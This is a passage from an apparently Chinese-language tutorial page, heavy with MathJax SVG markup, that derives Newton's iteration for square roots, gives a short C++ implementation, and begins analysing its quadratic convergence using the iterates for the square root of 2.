419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(10709.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(11709.9,0)"><g data-mml-node="mrow" transform="translate(220,752.2)"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(605,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1230.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2231,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(936,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msub" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><rect width="3031" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 经过整理，可以得到： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="15.324ex" height="5.224ex" role="img" focusable="false" viewBox="0 -1623.1 6773.2 2309.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3136.2,0)"><g data-mml-node="mrow" transform="translate(220,916.6)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1121.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(2121.4,0)"><g data-mml-node="mi" transform="translate(325.7,394) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="msub" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><rect width="835.7" height="60" x="120" y="220"></rect></g></g><g data-mml-node="mn" transform="translate(1568.5,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="3397.1" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 这个公式就是用来求平方根的迭代公式。每次通过更新 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span> 来逼近 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.491ex;" xmlns="http://www.w3.org/2000/svg" width="3.287ex" height="2.398ex" role="img" focusable="false" viewBox="0 -843 1453 1060"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(0,-17)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="600" height="60" x="853" y="723"></rect></g></g></g></svg></mjx-container></span>。</p>
<p>在实际应用中，我们希望在结果足够接近真实值时停止迭代。可以通过检查每次迭代后的结果差距是否小于某个阈值来实现这一点。以下是用代码实现的例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> EPS = <span class="number">1e-9</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">sqrt</span><span class="params">(<span class="type">double</span> n)</span> </span>{</span><br><span class="line">    <span class="type">double</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">abs</span>(x * x - n) &gt; EPS)</span><br><span class="line">        x = (x + n / x) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>该算法对于许多函数都是收敛的，但它只对某些特定类型的函数（如凸函数）能可靠地收敛。另一个问题是收敛的速度，若收敛发生，它的速度如何？对于平方根的求解，牛顿法通常表现得非常快。</p>
<h5 id="收敛速度分析">收敛速度分析</h5>
<p>以求 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.225ex;" xmlns="http://www.w3.org/2000/svg" width="3.061ex" height="2.398ex" role="img" focusable="false" viewBox="0 -960.5 1353 1060"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msqrt"><g transform="translate(853,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(0,100.5)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="500" height="60" x="853" y="840.5"></rect></g></g></g></svg></mjx-container></span>，从初始值 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="6.43ex" height="1.881ex" role="img" focusable="false" viewBox="0 -666 2842.1 831.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2342.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></span> 开始为例：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">1.0000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">1.5000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">1.4166666666666666666666666666666666666666666666666666666666675</span><br><span class="line">1.4142156862745098039215686274509803921568627450980392156862745</span><br><span class="line">1.4142135623746899106262955788901349101165596221157440445849057</span><br><span class="line">1.4142135623730950488016896235025302436149819257761974284982890</span><br><span class="line">1.4142135623730950488016887242096980785696718753772340015610125</span><br><span class="line">1.4142135623730950488016887242096980785696718753769480731766796</span><br></pre></td></tr></table></figure></div>
<p>仔细观察，我们可以看到每次迭代后正确的数字位数大约是翻倍的。这种惊人的收敛速度并非偶然。</p>
<p><strong>定量分析收敛速度</strong></p>
<p>为了定量地分析收敛速度，我们需要考虑第 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewBox="0 -661 345 672"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span> 次迭代的相对误差 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="1.744ex" height="1.979ex" role="img" focusable="false" viewBox="0 -717 771 874.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="mi" transform="translate(477,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>，并确定下一次迭代后误差 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.471ex;" xmlns="http://www.w3.org/2000/svg" width="3.789ex" height="2.093ex" role="img" focusable="false" viewBox="0 -717 1674.6 925"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D6FF" d="M195 609Q195 656 227 686T302 717Q319 716 351 709T407 697T433 690Q451 682 451 662Q451 644 438 628T403 612Q382 612 348 641T288 671T249 657T235 628Q235 584 334 463Q401 379 401 292Q401 169 340 80T205 -10H198Q127 -10 83 36T36 153Q36 286 151 382Q191 413 252 434Q252 435 245 449T230 481T214 521T201 566T195 609ZM112 130Q112 83 136 55T204 27Q233 27 256 51T291 111T309 178T316 232Q316 267 309 298T295 344T269 400L259 396Q215 381 183 342T137 256T118 179T112 130Z"></path></g><g data-mml-node="TeXAtom" transform="translate(477,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span> 会减少多少。</p>
<p>我们可以表达 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 